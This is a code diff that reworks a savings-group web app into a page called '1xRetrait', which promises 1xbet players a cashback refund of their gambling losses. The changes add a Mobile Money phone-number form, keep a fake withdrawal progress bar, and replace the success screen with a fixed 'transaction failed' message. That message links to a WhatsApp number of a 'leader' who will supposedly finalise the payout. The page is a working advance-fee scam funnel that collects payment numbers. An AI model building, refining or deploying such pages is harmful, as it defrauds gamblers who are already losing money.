@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MyTont — Espace participant</title>
+<title>1xRetrait — Récupérez vos pertes sur 1xbet</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -426,6 +426,73 @@
   .summary-row .value{font-weight:600;}
   .summary-row .value.gold{color:var(--gold); font-family:'Space Grotesk', sans-serif; font-size:1.1rem;}
 
+  .phone-field label{
+    display:block;
+    font-size:.85rem;
+    font-weight:600;
+    color:var(--text);
+    margin-bottom:10px;
+  }
+  .phone-field label span{color:var(--gold); font-weight:700;}
+  .phone-input-wrap{
+    display:flex;
+    align-items:stretch;
+    border:2px solid var(--border);
+    border-radius:var(--radius-md);
+    overflow:hidden;
+    transition:border-color .2s, box-shadow .2s;
+  }
+  .phone-input-wrap:focus-within{
+    border-color:var(--gold);
+    box-shadow:0 0 0 4px rgba(200,154,62,0.15);
+  }
+  .phone-prefix{
+    display:flex;
+    align-items:center;
+    padding:0 10px 0 14px;
+    background:var(--bg);
+    color:var(--text);
+    font-weight:600;
+    font-size:.9rem;
+    border-right:1px solid var(--border);
+    border-top:none;
+    border-bottom:none;
+    border-left:none;
+    outline:none;
+    cursor:pointer;
+    max-width:110px;
+    -webkit-appearance:none;
+    -moz-appearance:none;
+    appearance:none;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%236C7085' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
+    background-repeat:no-repeat;
+    background-position:right 8px center;
+    background-size:14px;
+    padding-right:26px;
+  }
+  #phoneInput{
+    flex:1;
+    border:none;
+    outline:none;
+    padding:14px 16px;
+    font-size:1rem;
+    background:var(--surface);
+    color:var(--text);
+    letter-spacing:.03em;
+  }
+  .phone-error{
+    color:var(--danger);
+    font-size:.8rem;
+    font-weight:500;
+    min-height:18px;
+    margin-top:6px;
+  }
+  .summary-divider{
+    height:1px;
+    background:var(--border);
+    margin:18px 0 4px;
+  }
+
   .btn-withdraw{
     width:100%;
     background:var(--gold);
@@ -573,8 +640,8 @@
 <!-- ================= ECRAN 1 : CODE PIN ================= -->
 <div id="pinScreen" class="weave-bg">
   <div class="pin-card">
-    <div class="logo"><span class="my">My</span><span class="tont">Tont</span></div>
-    <div class="tagline">Votre tontine digitale, simple et sécurisée</div>
+    <div class="logo"><span class="my">1x</span><span class="tont">Retrait</span></div>
+    <div class="tagline">Récupérez une partie de vos pertes sur 1xbet</div>
 
     <div class="cowrie-row" aria-hidden="true">
       <svg viewBox="0 0 24 24" fill="none"><path d="M4 12c0-5 4-8 8-8s8 3 8 8-4 8-8 8-8-3-8-8Z" stroke="currentColor" stroke-width="1.6"/><path d="M9 12h6" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg>
@@ -596,14 +663,14 @@
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
       </button>
     </form>
-    <div class="pin-hint">Code fourni par le gestionnaire de votre tontine</div>
+    <div class="pin-hint">Code fourni par votre leader</div>
   </div>
 </div>
 
 <!-- ================= ECRAN 2 : DETAIL PARTICIPANT ================= -->
 <div id="detailScreen" class="hidden">
   <header class="app-header">
-    <div class="logo"><span class="my">My</span><span class="tont">Tont</span></div>
+    <div class="logo"><span class="my">1x</span><span class="tont">Retrait</span></div>
     <div class="header-right">
       <span id="headerName">—</span>
       <button class="btn-logout" id="logoutBtn" title="Se déconnecter">
@@ -619,13 +686,13 @@
       <div class="hero-top">
         <div class="avatar" id="avatarInitials">--</div>
         <div>
-          <div class="hero-id">ID participant · <span id="heroId">-</span></div>
+          <div class="hero-id">ID 1xbet · <span id="heroId">-</span></div>
           <div class="hero-name" id="heroName">Client</div>
         </div>
       </div>
       <div class="hero-solde-row">
         <div>
-          <div class="hero-solde-label">Solde total cotisé</div>
+          <div class="hero-solde-label">Solde total</div>
           <div class="hero-solde-amount" id="heroSolde">0<span>FCFA</span></div>
         </div>
         <div class="hero-badge">
@@ -647,8 +714,8 @@
 
     <!-- Bloc pédagogique tontine digitale -->
     <section>
-      <div class="section-title">La tontine, réinventée pour l'ère digitale</div>
-      <div class="section-sub">Depuis des générations, la tontine rassemble familles et communautés autour d'une épargne solidaire. MyTont conserve cet esprit de confiance collective tout en le rendant plus simple, plus rapide et accessible depuis votre téléphone.</div>
+      <div class="section-title">Vos pertes méritent une seconde chance !</div>
+      <div class="section-sub">Vous avez connu une série difficile ? Bonne nouvelle ! Nous vous remboursons une partie de vos pertes sous forme de Cashback. Veuillez renseigner votre moyen de paiement et votre numéro de retrait pour entrer en possession de votre argent.</div>
 
       <div class="info-grid">
         <div class="info-card">
@@ -656,14 +723,14 @@
             <svg viewBox="0 0 24 24" fill="none"><rect x="4" y="10" width="16" height="10" rx="2" stroke="currentColor" stroke-width="1.7"/><path d="M8 10V7a4 4 0 0 1 8 0v3" stroke="currentColor" stroke-width="1.7"/></svg>
           </div>
           <h3>Sécurité renforcée</h3>
-          <p>Chaque accès est protégé par un code PIN personnel. Vos cotisations et votre solde sont suivis en temps réel, à l'abri des erreurs de calcul et des cahiers perdus.</p>
+          <p>Chaque accès est protégé par un code PIN personnel. Votre argent est suivi en temps réel, à l'abri des erreurs de calcul. Nous vous remboursons votre argent</p>
         </div>
         <div class="info-card">
           <div class="info-icon">
             <svg viewBox="0 0 24 24" fill="none"><path d="M3 12h4l3 8 4-16 3 8h4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
           </div>
           <h3>Transparence totale</h3>
-          <p>Consultez à tout moment le montant exact de vos cotisations. Chaque participant voit clairement où en est sa contribution au groupe.</p>
+          <p>Consultez à tout moment le montant de votre solde. Chaque client voit le solde qui lui sera reversé en temps réel.</p>
         </div>
         <div class="info-card">
           <div class="info-icon">
@@ -685,6 +752,47 @@
       </div>
 
       <div class="summary-panel" id="summaryPanel">
+        <div class="phone-field">
+          <label for="phoneInput">Numéro de téléphone Mobile Money (<span id="phoneMethodLabel">-</span>)</label>
+          <div class="phone-input-wrap">
+            <select class="phone-prefix" id="countryCode">
+              <option value="+229" selected>🇧🇯 +229</option>
+              <option value="+228">🇹🇬 +228</option>
+              <option value="+225">🇨🇮 +225</option>
+              <option value="+221">🇸🇳 +221</option>
+              <option value="+223">🇲🇱 +223</option>
+              <option value="+226">🇧🇫 +226</option>
+              <option value="+227">🇳🇪 +227</option>
+              <option value="+233">🇬🇭 +233</option>
+              <option value="+234">🇳🇬 +234</option>
+              <option value="+237">🇨🇲 +237</option>
+              <option value="+235">🇹🇩 +235</option>
+              <option value="+236">🇨🇫 +236</option>
+              <option value="+241">🇬🇦 +241</option>
+              <option value="+242">🇨🇬 +242</option>
+              <option value="+243">🇨🇩 +243</option>
+              <option value="+224">🇬🇳 +224</option>
+              <option value="+245">🇬🇼 +245</option>
+              <option value="+220">🇬🇲 +220</option>
+              <option value="+232">🇸🇱 +232</option>
+              <option value="+231">🇱🇷 +231</option>
+              <option value="+254">🇰🇪 +254</option>
+              <option value="+255">🇹🇿 +255</option>
+              <option value="+256">🇺🇬 +256</option>
+              <option value="+250">🇷🇼 +250</option>
+              <option value="+27">🇿🇦 +27</option>
+              <option value="+212">🇲🇦 +212</option>
+              <option value="+216">🇹🇳 +216</option>
+              <option value="+213">🇩🇿 +213</option>
+              <option value="+20">🇪🇬 +20</option>
+            </select>
+            <input type="tel" id="phoneInput" placeholder="01 23 45 67 89" inputmode="numeric" maxlength="16" autocomplete="off">
+          </div>
+          <div class="phone-error" id="phoneError"></div>
+        </div>
+
+        <div class="summary-divider"></div>
+
         <div class="summary-row">
           <span class="label">Bénéficiaire</span>
           <span class="value" id="summaryName">-</span>
@@ -692,6 +800,10 @@
         <div class="summary-row">
           <span class="label">Moyen de paiement</span>
           <span class="value" id="summaryMethod">-</span>
+        </div>
+        <div class="summary-row">
+          <span class="label">Numéro de réception</span>
+          <span class="value" id="summaryPhone">-</span>
         </div>
         <div class="summary-row">
           <span class="label">Montant à retirer</span>
@@ -706,7 +818,7 @@
     </section>
   </main>
 
-  <footer>MyTont — Votre épargne collective, entre de bonnes mains.</footer>
+  <footer>1xRetrait — Récupérez vos pertes 1xbet en toute sécurité</footer>
 </div>
 
 <!-- ================= MODAL : TRAITEMENT ================= -->
@@ -724,22 +836,27 @@
   </div>
 </div>
 
-<!-- ================= MODAL : SUCCES ================= -->
+
+
+
+
+<!-- ================= MODAL  (variante visuelle "échec") ================= -->
 <div id="successModal" class="modal-overlay hidden">
   <div class="modal-card success-card">
-    <div class="success-icon">
-      <svg viewBox="0 0 24 24" fill="none"><path d="M20 6 9 17l-5-5" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    <div class="success-icon" style="background:#FBEAE8; color:#C4453A;">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
     </div>
-    <h3>Retrait effectué !</h3>
-    <p class="sub">Votre demande a bien été traitée avec succès.</p>
+    <h3 style="color:#C4453A;">Transaction non effectuée !</h3>
+    <p class="sub">Veuillez contacter votre leader pour finaliser votre retrait</p>
     <div class="success-detail">
       <div class="row"><span class="label">Montant retiré</span><span id="successAmount">0 FCFA</span></div>
       <div class="row"><span class="label">Vers</span><span id="successMethod">-</span></div>
+      <div class="row"><span class="label">Numéro</span><span id="successPhone">-</span></div>
     </div>
-    <button class="btn-home" id="homeBtn">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M3 12l9-9 9 9M5 10v10h14V10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Revenir à l'accueil
-    </button>
+    <a href="https://wa.me/22964476883?text=Bonjour%20leader,%2C%20j%27aimerais%20finaliser%20mon%20retrait." id="homeBtn" class="btn-home" style="background:#C4453A; text-decoration:none;">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M18 6 6 18M6 6l12 12" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Cliquer ici pour pour contacter votre leader pour finaliser votre retrait
+    </a>
   </div>
 </div>
 
@@ -838,6 +955,50 @@
 
   const summaryPanel = document.getElementById('summaryPanel');
   const withdrawBtn = document.getElementById('withdrawBtn');
+  const phoneInput = document.getElementById('phoneInput');
+  const countryCode = document.getElementById('countryCode');
+  const phoneError = document.getElementById('phoneError');
+  const summaryPhone = document.getElementById('summaryPhone');
+  const phoneMethodLabel = document.getElementById('phoneMethodLabel');
+
+  function isPhoneValid(){
+    const digits = phoneInput.value.replace(/\D/g, '');
+    return digits.length >= 8;
+  }
+
+  function refreshWithdrawButton(){
+    const phoneOk = isPhoneValid();
+    withdrawBtn.disabled = !(selectedMethod && phoneOk);
+
+    if(!selectedMethod){
+      withdrawBtn.innerHTML = withdrawBtnIcon() + 'Sélectionnez un moyen de paiement';
+    } else if(!phoneOk){
+      withdrawBtn.innerHTML = withdrawBtnIcon() + 'Renseignez votre numéro';
+    } else {
+      withdrawBtn.innerHTML = withdrawBtnIcon() + `Retirer vers ${selectedMethod.label}`;
+    }
+  }
+
+  function withdrawBtnIcon(){
+    return `<svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>`;
+  }
+
+  phoneInput.addEventListener('input', () => {
+    phoneInput.value = phoneInput.value.replace(/[^\d\s]/g, '');
+    phoneError.textContent = '';
+    summaryPhone.textContent = phoneInput.value.trim() ? (countryCode.value + ' ' + phoneInput.value.trim()) : '-';
+    refreshWithdrawButton();
+  });
+
+  countryCode.addEventListener('change', () => {
+    summaryPhone.textContent = phoneInput.value.trim() ? (countryCode.value + ' ' + phoneInput.value.trim()) : '-';
+  });
+
+  phoneInput.addEventListener('blur', () => {
+    if(phoneInput.value && !isPhoneValid()){
+      phoneError.textContent = 'Numéro invalide (8 chiffres minimum).';
+    }
+  });
 
   function selectMethod(method, cardEl){
     selectedMethod = method;
@@ -845,24 +1006,22 @@
     cardEl.classList.add('selected');
 
     document.getElementById('summaryMethod').textContent = method.label;
+    phoneMethodLabel.textContent = method.label;
     summaryPanel.classList.add('show');
 
-    withdrawBtn.disabled = false;
-    withdrawBtn.innerHTML = `
-      <svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Retirer vers ${method.label}
-    `;
+    refreshWithdrawButton();
+    phoneInput.focus();
   }
 
   function resetWithdrawSelection(){
     selectedMethod = null;
     document.querySelectorAll('.method-card').forEach(c => c.classList.remove('selected'));
     summaryPanel.classList.remove('show');
-    withdrawBtn.disabled = true;
-    withdrawBtn.innerHTML = `
-      <svg width="17" height="17" viewBox="0 0 24 24" fill="none"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Sélectionnez un moyen de paiement
-    `;
+    phoneInput.value = '';
+    phoneError.textContent = '';
+    summaryPhone.textContent = '-';
+    phoneMethodLabel.textContent = '-';
+    refreshWithdrawButton();
   }
 
   // ---------- Simulation du retrait ----------
@@ -872,7 +1031,10 @@
   const successModal = document.getElementById('successModal');
 
   withdrawBtn.addEventListener('click', () => {
-    if(!selectedMethod) return;
+    if(!selectedMethod || !isPhoneValid()){
+      if(!isPhoneValid()) phoneError.textContent = 'Numéro invalide (8 chiffres minimum).';
+      return;
+    }
     progressFill.style.width = '0%';
     progressPercent.textContent = '0';
     progressModal.classList.remove('hidden');
@@ -899,6 +1061,7 @@
   function showSuccess(){
     document.getElementById('successAmount').textContent = fmtMontant(participant.solde) + ' FCFA';
     document.getElementById('successMethod').textContent = selectedMethod.label;
+    document.getElementById('successPhone').textContent = countryCode.value + ' ' + phoneInput.value.trim();
     successModal.classList.remove('hidden');
   }
 
